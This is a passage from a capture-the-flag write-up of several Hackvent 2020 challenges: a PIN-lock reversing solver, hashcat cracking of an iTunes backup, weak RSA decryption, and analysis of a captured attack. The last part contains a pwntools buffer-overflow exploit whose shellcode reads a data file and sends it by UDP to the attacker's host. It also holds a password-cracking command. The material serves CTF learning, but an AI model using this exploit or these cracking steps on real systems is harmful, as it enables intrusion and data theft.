      printf(s_PIN_(6_digits):_01326008);
      __nptr = gets(&DAT_013261be);
      __nptr[6] = '\0';
      int_input = atoi(__nptr);
      (*(FUN_0001124b + int_input * 0x14))();
      early_exit();
      printf(s_Unlocked_secret_is:_01326019);
      printf(&flag);
      return;
    }
    

For the most part, this is quite simple. It prints the message asking for a
six digit pin, reads that with `gets`, adds a null to the end to ensure it’s
only six digits, converts the string to an int. The next two lines are
interesting, and I’ll come back to them. Then it prints the message about the
unlocked secret, and the global `flag` string, and returns.

What’s odd is that first it calls the address at 0x1124b + input * 0x14. That
means there are a million different blocks of code that can be jumped into,
each 20 bytes apart. The other odd thing is the function I’ve labeled
`early_exit`, which calls `exit` to end the program. Since I’ve watched the
program successfully print, it either must jump there from within the million
code blocks, or it must print out the same thing elsewhere.

#### Jump Code

Looking at the code jumped to with PIN 000000, it’s pretty simple:

    
    
                                 LAB_0001124b -- pin 000000                      XREF[1]:     main:00011215(*)  
            0001124b b9 7c 2a        MOV        ECX,0x1502a7c
                     50 01
                                 LAB_00011250                                    XREF[1]:     00011254(j)  
            00011250 49              DEC        ECX
            00011251 83 f9 00        CMP        ECX,0x0
            00011254 75 fa           JNZ        LAB_00011250
            00011256 c6 03 7b        MOV        byte ptr [EBX],'{'
            00011259 43              INC        EBX
            0001125a e9 14 de        JMP        LAB_00aef073
                     ad 00
                                 LAB_0001125f -- pin 000001
            0001125f b9 a8 14        MOV        ECX,0x15014a8
                     50 01
                                 LAB_00011264                                    XREF[1]:     00011268(j)  
            00011264 49              DEC        ECX
            00011265 83 f9 00        CMP        ECX,0x0
            00011268 75 fa           JNZ        LAB_00011264
            0001126a c6 03 46        MOV        byte ptr [EBX],0x46
            0001126d 43              INC        EBX
            0001126e e9 58 3e        JMP        LAB_008d50cb
                     8c 00
    

It sets ECX to some large number, then enters a loop that decrements ECX,
breaking when ECX is 0. This is just a loop to waste some time / computer
cycles. Then it moves the character `{` into the address as EBX, increments
EBX, and jumps to some other address. What’s interesting is that this block is
exactly 0x14 = 20 bytes long, and immediately following this block is another
of the same form.

The character here is `{`, which is the first character in the string that
came out when I ran the program and entered 000000. Following the jump the
next block is the same, just with a `W` character:

    
    
                                 LAB_00aef073 -- pin 569730                      XREF[1]:     0001125a(j)  
            00aef073 b9 1a 0c        MOV        ECX,0x1500c1a
                     50 01
                                 LAB_00aef078                                    XREF[1]:     00aef07c(j)  
            00aef078 49              DEC        ECX
            00aef079 83 f9 00        CMP        ECX,0x0
            00aef07c 75 fa           JNZ        LAB_00aef078
            00aef07e c6 03 57        MOV        byte ptr [EBX],'W'
            00aef081 43              INC        EBX
            00aef082 e9 9c b2        JMP        LAB_00a1a323
                     f2 ff
    

In fact, if pin 569730 is entered, it prints the same output as pin 000000
without the first character:

    
    
    $ ./padawanlock 
    PIN (6 digits): 000000
    Unlocked secret is: {WE_HAVE_NO_CHOICE,_GENERAL_CALRISSIAN!_OUR_CRUISERS_CANT_REPEL_FIREPOWER_OF_THAT_MAGNITUDE!}
    
    $ ./padawanlock 
    PIN (6 digits): 569730
    Unlocked secret is: WE_HAVE_NO_CHOICE,_GENERAL_CALRISSIAN!_OUR_CRUISERS_CANT_REPEL_FIREPOWER_OF_THAT_MAGNITUDE!}
    

It’s clear the program is building the string based on the starting block
identified by the pin. Following this for a while, eventually it ends up with
a jump to 0x11226:

    
    
                                 LAB_0038318b                                    XREF[1]:     011c3e9e(j)  
            0038318b b9 65 01        MOV        ECX,0x1500165
                     50 01
                                 LAB_00383190                                    XREF[1]:     00383194(j)  
            00383190 49              DEC        ECX
            00383191 83 f9 00        CMP        ECX,0x0
            00383194 75 fa           JNZ        LAB_00383190
            00383196 c6 03 7d        MOV        byte ptr [EBX],'}'
            00383199 43              INC        EBX
            0038319a e9 87 e0        JMP        LAB_00011226
                     c8 ff
    

This is just back into `main`, to the line that loads the static “Unlocked
secret is:” string to pass to `printf`.

Each pin starts execution into this block of code, where it jumps around
collecting characters and wasting time before ending with the print.

#### Solver

Given this known understanding of the file, a Python script can read in the
binary file, focus on the 20 * 1000000 bytes of code blocks, and jump through
them collecting characters.

I’ll read in the file, and isolate the block of code:

    
    
    with open('padawanlock', 'rb') as f:
        binary = f.read()
    
    start = 4683
    block = binary[start:start+(1000000*20)]
    

Next, I’ll write a function that recursively builds the string. I takes a
starting block and will find the character at that offset (13 bytes into the
block), and then return that character + the function called with the offset
of the jump. The jump is a relative jump, so that address is relative to the
next instruction, which would be the start of the next block, or the start of
the current block plus 20.

I’ll use `lru_cache` so that any time the same block is passed in, it can
immediately return the result without re-running all the recursive calls.

    
    
    @lru_cache(None)
    def get_string(start):
        if start < 0:
            return ''
        c = chr(block[start + 13])
        if ord(c) > 127:
            import pdb;pdb.set_trace()
        rest = start + 20 + struct.unpack("<i", block[16+start:20+start])[0]
        return c + get_string(rest)
    

When the program tries to jump into the code above the first block (`start <
0`), it returns nothing as that’s the end of the string.

Now I can just loop over all million pins and look for a flag that starts with
`HC20{`:

    
    
    for i in range(1000000):
        res = get_string(i*20)
        if res.startswith('HV20{'):
            print(f'pin: {i:06d}  {res}')
            break
    

All of this comes together and returns the flag in about three seconds:

    
    
    $ time python3 solve.py
    pin: 451235  HV20{C0NF1GUR4T10N_AS_C0D3_N0T_D0N3_R1GHT}
    
    real    0m2.755s
    user    0m2.580s
    sys     0m0.130s   
    

If I comment out the `lru_cache`, it takes ten times as long:

    
    
    # time python3 solve.py
    pin: 451235  HV20{C0NF1GUR4T10N_AS_C0D3_N0T_D0N3_R1GHT}
    
    real    0m31.685s
    user    0m31.614s
    sys     0m0.021s
    

**Flag:`HV20{C0NF1GUR4T10N_AS_C0D3_N0T_D0N3_R1GHT}`**

The full code follows:

    
    
    #!/usr/bin/env python3
      
    import struct
    from functools import lru_cache
    
    
    # @lru_cache(None)
    def get_string(start):
        if start < 0:
            return ""
        c = chr(block[start + 13])
        if ord(c) > 127:
            import pdb
    
            pdb.set_trace()
        rest = start + 20 + struct.unpack("<i", block[16 + start : 20 + start])[0]
        return c + get_string(rest)
    
    
    with open("padawanlock", "rb") as f:
        binary = f.read()
    
    start = 4683
    block = binary[start : start + (1000000 * 20)]
    
    for i in range(1000000):
        res = get_string(i * 20)
        if res.startswith("HV20{"):
            print(f"pin: {i:06d}  {res}")
            break
    

## HV20.23

### Challenge

![hv20-ball23](https://0xdfimages.gitlab.io/img/hv20-ball23.png) | HV20.23 Those who make backups are cowards!  
---|---  
Categories: |  ![ios](../img/hv-cat-ios.png)IOS  
![crypto](../img/hv-cat-crypto.png)CRYPTO  
Level: | hard  
Author: |  hardlock   
  
> Santa tried to get an important file back from his old mobile phone backup.
> Thankfully he left a post-it note on his phone with the PIN. Sadly Rudolph
> thought the Apple was real and started eating it (there we go again…). Now
> only the first of eight digits, a **2** , is still visible…
>
> But maybe you can do something to help him get his important stuff back?
>
>
> [Download](https://drive.google.com/u/1/uc?id=1ECxckp7v9W3eofoahM7aJQO20pKB5irw&export=download)

The downloaded file contains a `.rar` archive.

### Solution

#### Recover Pin

The `.rar` archive contains an iOS backup. There’s a bunch of 40-hex character
named file that are different encrypted bits, as well as several other files.
Given that I want to recover the pin, I followed [this
article](https://medium.com/taptuit/breaking-into-encrypted-iphone-
backups-4dacc39403f0).
[itunes_backup2hashcat](https://github.com/philsmd/itunes_backup2hashcat) will
generate a hash from the `Manifest.plist` file:

    
    
    $ /opt/itunes_backup2hashcat/itunes_backup2hashcat.pl 5e8dfbc7f9f29a7645d66ef70b6f2d3f5dad8583/Manifest.plist 
    $itunes_backup$*9*892dba473d7ad9486741346d009b0deeccd32eea6937ce67070a0500b723c871a454a81e569f95d9*10000*0834c7493b056222d7a7e382a69c0c6a06649d9a**
    

I’ll save that hash in `Manifest.hash`. The format matches [hashcat mode
14700](https://hashcat.net/wiki/doku.php?id=example_hashes). Since I know the
password is eight digits, and the first is “2”, I can either make a wordlist,
or use masks in Hashcat. On originally solving, I just made a wordlist:

    
    
    $ for i in $(seq 20000000 30000000); do echo $i; done > nums
    

But a better way to do this is to give `-a 3` to specify using masks as
follows:

    
    
    $ hashcat -a 3 -m 14700 ./Manifest.hash 2?d?d?d?d?d?d?d
    ...[snip]...
    $itunes_backup$*9*892dba473d7ad9486741346d009b0deeccd32eea6937ce67070a0500b723c871a454a81e569f95d9*10000*0834c7493b056222d7a7e382a69c0c6a06649d9a**:20201225
    

That mask uses `?d` to represent an unknown digit. It finds a pin I probably
could have guessed, `20201225`.

#### Access Files

To access the files in the backup, I used a free trial of
[FonePaw](https://www.fonepaw.com/). On running it, there are some troll flags
(and a hidden flag, see below), but what’s important is two contacts, M and N,
each of which have a “notes” section that contains a very large integer:

![image-20201224125526073](https://0xdfimages.gitlab.io/img/image-20201224125526073.png)

Given the category of this challenge is crypto, and those two letters meaning
when it comes to RSA, seems like there’s an RSA problem to solve here.

#### RSA Manually

N is the public key in RSA, so I’ll need to factor it. factordb is a good
place to check, and it does [have this one
factored](http://factordb.com/index.php?query=77534090655128210476812812639070684519317429042401383232913500313570136429769).
Now I have p, q, n, and the message. I can assume the default e, 65537. That
means the private key, d, is the mod inverse of e and the product of p-1 and
q-1. In Python 3.8 and later, this can be done in one line:

    
    
    >>> pow(e, -1, (p-1)*(q-1))
    76980419378954446000209544312551541433862075603599424409197520797260187470901
    

With d, I can decrypt the message:

    
    
    >>> (pow(m,d,p*q)).to_bytes(27, 'big').decode()
    'HV20{s0rry_n0_gam3_to_play}'
    

**Flag:`HV20{s0rry_n0_gam3_to_play}`**

#### RsaCtfTool

[RsaCtfTool](https://github.com/Ganapati/RsaCtfTool) can do all of that math
starting with n, e, and m through the plaintext message:

    
    
    # python3 /opt/RsaCtfTool/RsaCtfTool.py -n 77534090655128210476812812639070684519317429042401383232913500313570136429769 -e 65537 --uncipher 6344440980251505214334711510534398387022222632429506422215055328147354699502 --attack factordb
    private argument is not set, the private key will not be displayed, even if recovered.
    
    [*] Testing key /tmp/tmpnjopalj8.
    [*] Performing factordb attack on /tmp/tmpnjopalj8.
    
    Results for /tmp/tmpnjopalj8:
    
    Unciphered data :
    HEX : 0x0000000000485632307b73307272795f6e305f67616d335f746f5f706c61797d
    INT (big endian) : 29757593747455483525592829184976151422656862335100602522242480509
    INT (little endian) : 56753566960650598288217394598913266125073984765818621753275514254169309446144
    STR : b'\x00\x00\x00\x00\x00HV20{s0rry_n0_gam3_to_play}'
    

I included the attack type of factordb, but it will do a bunch of other things
and eventually get to that same conclusion (and fun for much longer) without
that flag. Then it decrypts the message and prints the flag.

## HV20.H3

### Challenge

![hv20-ballH3](https://0xdfimages.gitlab.io/img/hv20-ballH3.png) | HV20.H3 Hidden in Plain Sight  
---|---  
Categories: |  ![hidden](../img/hv-cat-hidden.png)HIDDEN   
Level: | medium  
Author: |  hardlock   
  
> I don’t know

### Solution

In the previous challenge FonePaw showed not only the two contacts M and N,
but a third contact with no name:

![image-20201224125526073](https://0xdfimages.gitlab.io/img/image-20201224125526073.png)

That contact contains only a homepage, but on inspection, the url doesn’t look
like a valid url:

![](https://0xdfimages.gitlab.io/img/image-20201227070610769.png)

It does look like base64, which decodes to the hidden flag:

    
    
    $ echo SFYyMHtpVHVuM3NfYmFja3VwX2YwcmVuc2l4X0ZUV30= | base64 -d
    HV20{iTun3s_backup_f0rensix_FTW}
    

## HV20.24

### Challenge

![hv20-ball24](https://0xdfimages.gitlab.io/img/hv20-ball24.png) | HV20.24 Santa's Secure Data Storage  
---|---  
Categories: |  ![exploitation](../img/hv-cat-exploitation.png)EXPLOITATION  
![network security](../img/hv-cat-network_security.png)NETWORK SECURITY  
![reverse engineering](../img/hv-cat-reverse_engineering.png)REVERSE
ENGINEERING  
![crypto](../img/hv-cat-crypto.png)CRYPTO  
Level: | leet  
Author: |  [scryh](https://twitter.com/scryh_)  
  
> In order to prevent the leakage of any flags, Santa decided to instruct his
> elves to implement a secure data storage, which encrypts all entered data
> before storing it to disk.
>
> According to the paradigm _Always implement your own crypto_ the elves
> designed a custom hash function for storing user passwords as well as a
> custom stream cipher, which is used to encrypt the stored data.
>
> Santa is very pleased with the work of the elves and stores a flag in the
> application. For his password he usually uses the _secure password
> generator_ `shuf -n1 rockyou.txt`.
>
> Giving each other a pat on the back for the good work the elves lean back in
> their chairs relaxedly, when suddenly the intrusion detection system raises
> an alert: the application seems to be exploited remotely!
>
> Mission
>
> Santa and the elves need your help!
>
> The intrusion detection system captured the network traffic of the whole
> attack.
>
> How did the attacker got in? Was (s)he able to steal the flag?
>
> [Download](/files/66aeb596-2ba0-4d07-a8de-3eb27eedb791.zip)

The given zip archive containing a Bash script, an ELF executable, an empty
folder, and a packet capture:

    
    
    $ unzip -l 66aeb596-2ba0-4d07-a8de-3eb27eedb791.zip 
    Archive:  66aeb596-2ba0-4d07-a8de-3eb27eedb791.zip
      Length      Date    Time    Name
    ---------  ---------- -----   ----
           78  2020-10-29 08:25   server.sh
        17832  2020-10-29 08:14   data_storage
            0  2020-10-29 08:32   data/
         3620  2020-12-16 03:10   attack.pcapng
    ---------                     -------
        21530                     4 files
    $ file server.sh data_storage attack.pcapng 
    server.sh:     Bourne-Again shell script, ASCII text executable
    data_storage:  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4f732bdcc708dd6885deaf71d1971f8e81cc4f55, for GNU/Linux 3.2.0, not stripped
    attack.pcapng: pcapng capture file - version 1.0
    

### Solution

#### Overview

The PCAP shows an attack on this hosted binary, and I’ll dig into that in
detail.

The Bash script runs `socat` in such a way that the ELF binary is served over
TCP port 5555.

    
    
    #!/bin/bash
    socat TCP4-LISTEN:5555,reuseaddr,fork EXEC:./data_storage,stderr;
    

The program is a data storage application. It will ask for a username, and
then either prompt to create a password for a new user, or ask for a password
for a returning user. The user can store data, retrieve data, and delete that
data.

    
    
    $  ./data_storage 
    welcome to santa's secure data storage!
    please login with existing credentials or enter new username ...
    username> 0xdf
    creating user '0xdf' ...
    please set your password (max-length: 19)
    password> 0xdf
    welcome 0xdf!
    [0] show data
    [1] enter data
    [2] delete data
    [3] quit
    choice> 0
    no data found!
    [0] show data
    [1] enter data
    [2] delete data
    [3] quit
    choice> 1
    data> this is test data
    [0] show data
    [1] enter data
    [2] delete data
    [3] quit
    choice> 0
    your secret data:
    this is test data
    [0] show data
    [1] enter data
    [2] delete data
    [3] quit
    choice> 3
    good bye!
    

After that session, two files were created in `data/`:

    
    
    $ ls data/
    0xdf_data.txt  0xdf_pwd.txt
    

No matter what is entered, the `[username]_pwd.txt` file is 16 bytes:

    
    
    $ xxd data/0xdf_pwd.txt 
    00000000: 2674 8f0c a033 df36 a7fa 3396 2579 368f  &t...3.6..3.%y6.
    

The `[username]_data.txt` file is the same length as the input data:

    
    
    $ xxd data/0xdf_data.txt 
    00000000: 2a29 0bc2 5af2 45d1 8d48 e737 5fbd 991b  *)..Z.E..H.7_...
    00000010: 2f51                                     /Q
    

This matches with the information provided in the challenge assuming the
hashing algorithm is being applied to the password and the stream cipher is
being applied to the data, as a hashing algorithm would produce a fixed length
output, and the stream cipher would produce output the same length as the
input.

#### Static RE

Because the binary is not stripped, opening it in Ghidra presents helpful
function names:

![image-20201227071401530](https://0xdfimages.gitlab.io/img/image-20201227071401530.png)

The `main` function calls `login_username`, `login_password`, and `show_menu`:

    
    
    undefined8 main(void)
    
    {
      setvbuf(stdin,(char *)0x0,2,0);
      setvbuf(stdout,(char *)0x0,2,0);
      setvbuf(stderr,(char *)0x0,2,0);
      login_username();
      login_password();
      show_menu();
      return 0;
    }
    

`show_menu` prints the menu, processes the input, and then calls the
appropriate function:

    
    
    void show_menu(void)
    
    {
      char input_str [10];
      char user_data_file [44];
      int input_int;
      
      snprintf(user_data_file,0x28,"data/%s_data.txt",username);
      while( true ) {
        while( true ) {
          while( true ) {
            while( true ) {
              puts("[0] show data");
              puts("[1] enter data");
              puts("[2] delete data");
              puts("[3] quit");
              printf("choice> ");
              fgets(input_str,1000,stdin);
              input_int = atoi(input_str);
              if (input_int != 0) break;
              show_data(user_data_file);
            }
            if (input_int != 1) break;
            enter_data(user_data_file);
          }
          if (input_int != 2) break;
          delete_data(user_data_file);
        }
        if (input_int == 3) break;
        puts("unknown choice!");
      }
      puts("good bye!");
      return;
    }
    

Right away I see the buffer overflow where it calls `fgets` to read up to 1000
bytes of menu choice into a 10 byte buffer. To reach the return, the result of
`atoi` on the input string will have to be 3, but that just means that any
string starting with `3[non-digit]` will work.

Functions like `show_data` work as expected, trying to read the data from the
`_data.txt` file and passing the contents to `decrypt`:

    
    
    void show_data(char *user_data_file)
    
    {
      int iVar1;
      FILE *fd;
      size_t *outlen;
      size_t in_R8;
      EVP_PKEY_CTX buffer [104];
      FILE *fd_copy;
      
      iVar1 = access(user_data_file,0);
      if (iVar1 == -1) {
        puts("no data found!");
      }
      else {
        memset(buffer,0,100);
        fd = fopen(user_data_file,"r");
        fd_copy = fd;
        fread(buffer,1,100,fd);
        fclose(fd_copy);
        decrypt(buffer,pwd_hash);
        printf("your secret data:\n%s\n",buffer);
      }
      return;
    }
    

Interestingly, the `decrypt` function also takes a global variable,
`pwd_hash`, which is set in the `login_password` function via the `calc_hash`
function. `decrypt` loops over the input files, calling `keystream_get_char`,
xoring the result with the current byte, and then breaking if the resulting
plaintext is null.

    
    
    int decrypt(uchar *buffer,uchar *pwhash)
    
    {
      long kchar;
      uint i;
      
      i = 0;
      while( true ) {
        kchar = keystream_get_char(i,(long)pwhash);
        buffer[(int)i] = (byte)kchar ^ buffer[(int)i];
        if (buffer[(int)i] == 0) break;
        i = i + 1;
      }
      return 0;
    }
    

#### Recreate Hash Function

The custom hashing function is not complicated:

    
    
    void calc_hash(long password,ulong password_len,void *buffer)
    
    {
      char chr;
      ulong buf1 [4];
      int i;
      ulong buf2 [4];
      
      buf1[0] = 0x68736168;
      buf1[1] = 0xdeadbeef;
      buf1[2] = 0x65726f6d;
      buf1[3] = 0xc00ffeee;
      buf2[3] = 0x68736168;
      buf2[2] = 0xdeadbeef;
      buf2[1] = 0x65726f6d;
      buf2[0] = 0xc00ffeee;
      i = 0;
      while ((ulong)(long)i < password_len) {
        chr = *(char *)(password + i);
        buf1[1] = buf2[3] ^ (long)(int)(chr * i & 0xffU ^ (int)chr |
                                       ((int)chr * (i + 0x31) & 0xffU ^ (int)chr) << 0x18 |
                                       ((int)chr * (i + 0x42) & 0xffU ^ (int)chr) << 0x10 |
                                       ((int)chr * (i + 0xef) & 0xffU ^ (int)chr) << 8);
        buf1[2] = buf2[2] ^ (long)(int)(chr * i & 0x5aU ^ (int)chr |
                                       ((int)chr * (i + 0xc0) & 0xffU ^ (int)chr) << 0x18 |
                                       ((int)chr * (i + 0x11) & 0xffU ^ (int)chr) << 0x10 |
                                       ((int)chr * (i + 0xde) & 0xffU ^ (int)chr) << 8);
        buf1[3] = buf2[1] ^ (long)(int)(chr * i & 0x22U ^ (int)chr |
                                       ((int)chr * (i + 0xe3) & 0xffU ^ (int)chr) << 0x18 |
                                       ((int)chr * (i + 0xde) & 0xffU ^ (int)chr) << 0x10 |
                                       ((int)chr * (i + 0xd) & 0xffU ^ (int)chr) << 8);
        buf1[0] = buf2[0] ^ (long)(int)(chr * i & 0xefU ^ (int)chr |
                                       ((int)chr * (i + 0x52) & 0xffU ^ (int)chr) << 0x18 |
                                       ((int)chr * (i + 0x24) & 0xffU ^ (int)chr) << 0x10 |
                                       ((int)chr * (i + 0x33) & 0xffU ^ (int)chr) << 8);
        i = i + 1;
        buf2[0] = buf1[0];
        buf2[1] = buf1[3];
        buf2[2] = buf1[2];
        buf2[3] = buf1[1];
      }
      *(ulong *)buffer = buf1[0];
      *(ulong *)((long)buffer + 4) = buf1[1];
      *(ulong *)((long)buffer + 8) = buf1[2];
      *(ulong *)((long)buffer + 0xc) = buf1[3]
      return;
    }
    

It initializes four four-byte words to static values, and then loops over each
character of the input xoring each byte by some variation on the input byte.
Then it shuffles the four words around, and repeats. I can recreate this in
Python relatively easily:

    
    
    def gen_hash(s):
        buf1 = [0x68736168, 0xdeadbeef, 0x65726f6d, 0xc00ffeee]
        buf2 = [0xc00ffeee, 0x65726f6d, 0xdeadbeef, 0x68736168]
    
        for i in range(len(s)):
            c = ord(s[i])
            buf1[1] = buf2[3] ^ (((i * c) & 0xff) ^ c |
                      ((((i + 0x31) * c) & 0xff) ^ c) << 0x18 |
                      ((((i + 0x42) * c) & 0xff) ^ c) << 0x10 |
                      ((((i + 0xef) * c) & 0xff) ^ c) << 0x8)
            buf1[2] = buf2[2] ^ (((i * c) & 0x5a) ^ c |
                      ((((i + 0xc0) * c) & 0xff) ^ c) << 0x18 |
                      ((((i + 0x11) * c) & 0xff) ^ c) << 0x10 |
                      ((((i + 0xde) * c) & 0xff) ^ c) << 0x8)
            buf1[3] = buf2[1] ^ (((i * c) & 0x22) ^ c |
                      ((((i + 0xe3) * c) & 0xff) ^ c) << 0x18 |
                      ((((i + 0xde) * c) & 0xff) ^ c) << 0x10 |
                      ((((i + 0xd) * c) & 0xff) ^ c) << 0x8)
            buf1[0] = buf2[0] ^ (((i * c) & 0xef) ^ c |
                      ((((i + 0x52) * c) & 0xff) ^ c) << 0x18 |
                      ((((i + 0x24) * c) & 0xff) ^ c) << 0x10 |
                      ((((i + 0x33) * c) & 0xff) ^ c) << 0x8)
    
            buf2 = [buf1[0], buf1[3], buf1[2], buf1[1]]
    
        return struct.pack('<IIII', *buf1)
    

When recreating this kind of bit-wise operation in Python from C, it’s
important to make sure that the bit boundaries are followed. For example, a
one byte char in C with the value 0x44 shifted left by two bits would return
0x10, where as Python would return 0x110. C cares very much about the size of
the element holding the value, whereas Python is more forgiving. It’s ok here
because in each case, the code will use `& 0xff` to get just one byte, and
then shift that into place.

With this complete, I can test by hashing “0xdf” and validating that the
result matches what is stored in the `data` directory.

    
    
    root@kali# python3 -i hash.py
    >>> with open('data/0xdf_pwd.txt', 'rb') as f:
    ...     hash_0xdf = f.read()
    ...
    >>> gen_hash('0xdf')
    b'&t\x8f\x0c\xa03\xdf6\xa7\xfa3\x96%y6\x8f'
    >>> hash_0xdf
    b'&t\x8f\x0c\xa03\xdf6\xa7\xfa3\x96%y6\x8f'
    >>> gen_hash('0xdf') == hash_0xdf
    True
    

#### Recreate Keystream

Ghidra totally simplifies this function in a way that I did not believe at
first. It suggests that the keystream by at position i is calculated by taking
the ith byte of the hash (mod 16, so it just loops to the beginning). That
byte mod 10 is used to grab a byte from a static byte string, `key`, which is
xored by the hash byte and i to make the key byte.

    
    
    long keystream_get_char(uint i,long pwhash)
    
    {
      char hash_byte;
      uint zero;
      char key [10];
      
      key._0_8_ = 0x563412c0efbeadde;
      key._8_2_ = 0x9a78;
      zero = (uint)((int)i >> 0x1f) >> 0x1c;
      hash_byte = *(char *)(pwhash + (int)((i + zero & 0xf) - zero));  # get byte (i mod 16) from hash
      return (long)(int)((int)key[(ulong)(long)hash_byte % 10] ^ (int)hash_byte ^ i);
    }
    

There’s a bit of weirdness that could come into play for i really big, but
I’ll ignore that. Not believing this disassembly, I actually went thought the
hassel of making the Python equivalent of the assembly that looks like:

    
    
            00401a90 55              PUSH       RBP
            00401a91 48 89 e5        MOV        RBP,RSP
            00401a94 89 7d dc        MOV        dword ptr [RBP + local_2c],EDI
            00401a97 48 89 75 d0     MOV        qword ptr [RBP + local_38],RSI
            00401a9b 48 b8 de        MOV        RAX,0x563412c0efbeadde
                     ad be ef 
                     c0 12 34 56
            00401aa5 48 89 45 e6     MOV        qword ptr [RBP + key[0]],RAX
            00401aa9 66 c7 45        MOV        word ptr [RBP + key[8]],0x9a78
                     ee 78 9a
            00401aaf 8b 45 dc        MOV        EAX,dword ptr [RBP + local_2c]
            00401ab2 99              CDQ
            00401ab3 c1 ea 1c        SHR        EDX,0x1c
            00401ab6 01 d0           ADD        EAX,EDX
            00401ab8 83 e0 0f        AND        EAX,0xf
            00401abb 29 d0           SUB        EAX,EDX
            00401abd 48 63 d0        MOVSXD     RDX,EAX
            00401ac0 48 8b 45 d0     MOV        RAX,qword ptr [RBP + local_38]
            00401ac4 48 01 d0        ADD        RAX,RDX
            00401ac7 0f b6 00        MOVZX      EAX,byte ptr [RAX]
            00401aca 88 45 ff        MOV        byte ptr [RBP + pwhash_byte],AL
            00401acd 0f be 45 ff     MOVSX      EAX,byte ptr [RBP + pwhash_byte]
            00401ad1 33 45 dc        XOR        EAX,dword ptr [RBP + local_2c]
            00401ad4 89 c6           MOV        ESI,EAX
            00401ad6 48 0f be        MOVSX      RCX,byte ptr [RBP + pwhash_byte]
                     4d ff
            00401adb 48 ba cd        MOV        RDX,-0x3333333333333333
                     cc cc cc 
                     cc cc cc cc
            00401ae5 48 89 c8        MOV        RAX,RCX
            00401ae8 48 f7 e2        MUL        RDX
            00401aeb 48 c1 ea 03     SHR        RDX,0x3
            00401aef 48 89 d0        MOV        RAX,RDX
            00401af2 48 c1 e0 02     SHL        RAX,0x2
            00401af6 48 01 d0        ADD        RAX,RDX
            00401af9 48 01 c0        ADD        RAX,RAX
            00401afc 48 29 c1        SUB        RCX,RAX
            00401aff 48 89 ca        MOV        RDX,RCX
            00401b02 0f b6 44        MOVZX      EAX,byte ptr [RBP + RDX*0x1 + -0x1a]
                     15 e6
            00401b07 0f be c0        MOVSX      EAX,AL
            00401b0a 31 f0           XOR        EAX,ESI
            00401b0c 48 98           CDQE
            00401b0e 48 89 45 f0     MOV        qword ptr [RBP + local_18],RAX
            00401b12 48 8b 45 f0     MOV        RAX,qword ptr [RBP + local_18]
            00401b16 5d              POP        RBP
            00401b17 c3              RET
    

There’s some tricks in there multiplying by -0x3333333333333333, shifting, etc
that end up just be the mod 10 Ghidra identified. So the function can be:

    
    
    def gen_key_byte(i, bhash):
        key = b'\xde\xad\xbe\xef\xc0\x12\x34\x56\x78\x9a'
        hb = bhash[i % 0x10]
        hbxi = hb ^ i
        if hbxi > 127:
            hbxi |= 0xffffff00
        hbsx = hb | 0xffffffffffffff00 if hb > 127 else hb
        prod = 0xcccccccccccccccd * hbsx
        rdx = 10 * (prod >> 67)
        idx = hbsx - rdx
        from_key = key[idx]
        return (hbxi ^ from_key) & 0xff
    

But it can also just be:

    
    
    def gen_key_byte(i, bhash):
        key = b'\xde\xad\xbe\xef\xc0\x12\x34\x56\x78\x9a'
        return key[bhash[i % 0x10] % 10] ^ bhash[i % 0x10] ^ i
    

#### Attack

Looking at `attack.pcapng`, all but one of the packets are a single TCP stream
from 192.168.0.42 to the the server at 192.168.0.1 on port 5555 (which matches
`server.sh`):

![image-20201227112201907](https://0xdfimages.gitlab.io/img/image-20201227112201907.png)

Immediately after, there’s a single UDP port 53 packet, which Wireshark thinks
is DNS, but doesn’t seem like valid DNS (at least not in the query):

![image-20201227112516544](https://0xdfimages.gitlab.io/img/image-20201227112516544.png)

The attacker entered a long buffer at the `choice>` prompt, which would be
exploiting the buffer overflow noted earlier. Looking at the stream as hex,
I’ll grab all the bytes sent.

#### Debug

To debug this, I’ll write a short Python script that exploits the same way as
in the PCAP:

    
    
    #!/usr/bin/env python3
    
    from pwn import *
    
    
    p = process('./data_storage')
    
    p.readuntil('username> ')
    p.sendline('evil0r')
    p.readuntil('password> ')
    p.sendline('lovebug1')
    
    input('Attach gdb and hit enter to continue')
    
    payload = '3 ' + 'A'*64 + "\x10\x41\x40\x00\x00\x00\x00\x00\x68\x74\x78\x74\x00\x48\xbf\x74\x61\x5f\x64\x61\x74\x61\x2e\x57\x48\xbf\x64\x61\x74\x61\x2f\x73\x61\x6e\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\xba\x00\x00\x01\x00\x01\x00\x00\x00\x52\x6a\x00\x6a\x00\x6a\x00\x6a\x00\x48\x89\xe6\x48\xba\x01\x00\x00\x00\x00\x00\x00\x20\x52\x48\xba\x00\x00\x00\x13\x37\x01\x00\x00\x52\xba\x20\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\x48\x31\xc9\x81\x34\x0e\xef\xbe\xad\xde\x48\x83\xc1\x04\x48\x83\xf9\x20\x75\xef\xbf\x02\x00\x00\x00\xbe\x02\x00\x00\x00\x48\x31\xd2\xb8\x29\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xc6\x03\xba\x32\x00\x00\x00\x41\xba\x00\x00\x00\x00\x6a\x00\x49\xb8\x02\x00\x00\x35\xc0\xa8\x00\x2a\x41\x50\x49\x89\xe0\x41\xb9\x10\x00\x00\x00\xb8\x2c\x00\x00\x00\x0f\x05\xbf\x00\x00\x00\x00\xb8\x3c\x00\x00\x00\x0f\x05\x0a"
    
    p.send(payload)
    p.interactive()
    

I can run this, then in a different window run `gdb -p $(pidof data_storage)`
to attach to it and debug it.

The attack overwrites the return address with 0x404110, which is the global
address of `pwhash`. The trick here is that the hash of “lovebug1”, the
password given, starts with 0xff 0xe4:

    
    
    >>> gen_hash('lovebug1')
    b'\xff\xe4\xb2\x8bi\x9f(@\xee!\xe5\x1f<#\xed\x0f'
    

0xffe4 is the instruction for JMP RSP, which will be the rest of the payload
above. Trying to run this in a debugger will fail because the memory segment
containing 0x404110 is not marked executable:

    
    
    gdb-peda$ vmmap 
    Start              End                Perm      Name
    0x00400000         0x00401000         r--p      /media/sf_CTFs/hackvent2020/day24/data_storage
    0x00401000         0x00402000         r-xp      /media/sf_CTFs/hackvent2020/day24/data_storage
    0x00402000         0x00403000         r--p      /media/sf_CTFs/hackvent2020/day24/data_storage
    0x00403000         0x00404000         r--p      /media/sf_CTFs/hackvent2020/day24/data_storage
    0x00404000         0x00405000         rw-p      /media/sf_CTFs/hackvent2020/day24/data_storage
